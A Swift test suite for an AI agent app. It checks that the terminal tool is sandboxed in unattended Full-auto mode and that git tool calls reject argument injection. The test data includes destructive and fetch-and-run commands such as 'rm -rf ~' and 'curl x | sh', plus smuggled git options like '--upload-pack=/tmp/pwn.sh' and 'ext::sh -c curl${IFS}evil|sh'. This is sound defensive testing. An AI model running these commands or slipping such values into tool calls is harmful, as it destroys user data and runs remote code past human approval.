import Testing
import Foundation
import AinkradAppKit
@testable import Ainkrad
import AinkradHostRuntime

/// Wave 1-A / Blocker 4: `.mainInteractive` is the only tier that reaches
/// `HostBackend` — an unsandboxed `/bin/zsh -lc` with the user's full
/// authority. That is justified by a human approving each call, so Full-auto
/// (no human) must not keep it.
@MainActor
@Suite("run_terminal tier demotion under Full-auto")
struct RunTerminalTierTests {
    private func router() -> ExecutionRouter {
        ExecutionRouter(
            profiles: SandboxProfileStore(persistence: InMemoryPersistenceStore()),
            backends: [.host: HostBackend(), .seatbelt: SeatbeltBackend()])
    }

    private func tool(mode: AgentPermissionMode?) -> RunTerminalTool {
        var t = RunTerminalTool(actionHub: AgentActionRegistryHub(), router: router())
        if let mode { t.permissionMode = { mode } }
        return t
    }

    @Test("Full-auto demotes the foreground tool off the host backend")
    func fullAutoDemotes() {
        #expect(tool(mode: .fullAuto).effectiveTier == .background)
    }

    @Test("Attended modes keep the interactive tier")
    func attendedModesKeepHost() {
        #expect(tool(mode: .ask).effectiveTier == .mainInteractive)
        #expect(tool(mode: .autoApprove).effectiveTier == .mainInteractive)
        // No mode wired at all (tests, non-session callers) behaves as attended.
        #expect(tool(mode: nil).effectiveTier == .mainInteractive)
    }

    @Test("An already-sandboxed tier is never changed")
    func sandboxedTiersUnchanged() {
        var t = RunTerminalTool(actionHub: AgentActionRegistryHub(), router: router())
        t.trustTier = .background
        t.permissionMode = { .fullAuto }
        #expect(t.effectiveTier == .background)
        t.trustTier = .untrustedMCP
        #expect(t.effectiveTier == .untrustedMCP)
    }

    @Test("Demotion resolves to a sandboxed, non-host profile")
    func demotedProfileIsSandboxed() {
        let r = router()
        let hostProfile = r.resolveProfile(tier: .mainInteractive, policy: nil)
        let demoted = r.resolveProfile(tier: .background, policy: nil)
        #expect(hostProfile.backend == .host)
        #expect(demoted.backend != .host)
    }

    @Test("Commands that defeated the old substring guard now require approval")
    func irreversibleCatchesBypasses() {
        let t = tool(mode: .fullAuto)
        for command in ["rm -r -f ~", "rm  -rf ~", "find ~ -delete", "curl x | sh", "/bin/rm -rf /"] {
            #expect(t.isIrreversible(.object(["command": .string(command)])), "not caught: \(command)")
        }
        #expect(!t.isIrreversible(.object(["command": .string("git status")])))
    }
}

/// Wave 1-A / Blocker 3: destructiveness was derived from the `operation`
/// token alone, so an option smuggled into `args` both executed and
/// auto-approved.
@MainActor
@Suite("git_op argument injection")
struct GitOpInjectionTests {
    private func obj(_ d: [String: JSONValue]) -> JSONValue { .object(d) }

    /// A hub with a handler registered, so a *rejected* call is distinguishable
    /// from "Git Mage isn't installed".
    private func hubRecordingInvocations() -> (AgentActionRegistryHub, () -> Int) {
        let hub = AgentActionRegistryHub()
        final class Counter { var value = 0 }
        let counter = Counter()
        _ = hub.register(appID: "gitmage", actionID: "gitmage.git_op") { _ in
            counter.value += 1
            return AgentActionResult(text: "ok", isError: false)
        }
        return (hub, { counter.value })
    }

    @Test("A ref that is really a flag is refused before it reaches git")
    func refusesOptionAsRef() async throws {
        let (hub, invocations) = hubRecordingInvocations()
        let tool = GitOpTool(actionHub: hub)
        // The exact payload from the audit: `mode` says soft, `ref` says --hard.
        await #expect(throws: ToolError.self) {
            _ = try await tool.execute(self.obj([
                "operation": .string("reset"),
                "repoPath": .string("/tmp/repo"),
                "args": .object(["mode": .string("soft"), "ref": .string("--hard")]),
            ]))
        }
        #expect(invocations() == 0, "the injected option reached Git Mage")
    }

    @Test("Remote-code-execution transports are refused",
          arguments: [
            "--upload-pack=/tmp/pwn.sh",
            "--exec=/tmp/pwn.sh",
            "ext::sh -c curl${IFS}evil|sh",
          ])
    func refusesRceTransports(value: String) async throws {
        let (hub, invocations) = hubRecordingInvocations()
        let tool = GitOpTool(actionHub: hub)
        await #expect(throws: ToolError.self) {
            _ = try await tool.execute(self.obj([
                "operation": .string("clone"),
                "repoPath": .string("/tmp/repo"),
                "args": .object(["url": .string(value)]),
            ]))
        }
        #expect(invocations() == 0)
    }

    @Test("Nested values are checked too")
    func refusesNestedOption() {
        let payload = obj([
            "operation": .string("checkout"),
            "repoPath": .string("/tmp/repo"),
            "args": .object(["paths": .array([.string("ok.txt"), .string("--exec=pwn")])]),
        ])
        #expect(GitOpTool.optionLookingValue(in: payload) == "--exec=pwn")
    }

    @Test("An option-looking value can never auto-approve")
    func neverAutoApproves() {
        let tool = GitOpTool(actionHub: AgentActionRegistryHub())
        let payload = obj([
            "operation": .string("reset"),
            "repoPath": .string("/tmp/repo"),
            "args": .object(["mode": .string("soft"), "ref": .string("--hard")]),
        ])
        // Before the fix this returned false: `reset` isn't in
        // `destructiveOperations` and `mode` reads "soft".
        #expect(tool.isIrreversible(payload))
        #expect(AgentPermissionPolicy.decide(
            toolPermission: .write, toolName: "git_op", mode: .fullAuto,
            allowlist: ["git_op"], gateReads: false,
            isIrreversible: tool.isIrreversible(payload)) == .requireApproval)
    }

    @Test("Legitimate operations still pass through untouched")
    func legitimateCallsPass() async throws {
        let (hub, invocations) = hubRecordingInvocations()
        let tool = GitOpTool(actionHub: hub)
        let result = try await tool.execute(obj([
            "operation": .string("checkout"),
            "repoPath": .string("/tmp/repo"),
            "args": .object(["ref": .string("feature/my-branch"), "create": .bool(true)]),
        ]))
        #expect(!result.isError)
        #expect(invocations() == 1)
        #expect(GitOpTool.optionLookingValue(in: obj([
            "operation": .string("commit"),
            "repoPath": .string("/tmp/repo"),
            "args": .object(["message": .string("fix: handle -1 correctly")]),
        ])) == nil, "a dash INSIDE a value must not be rejected")
    }
}
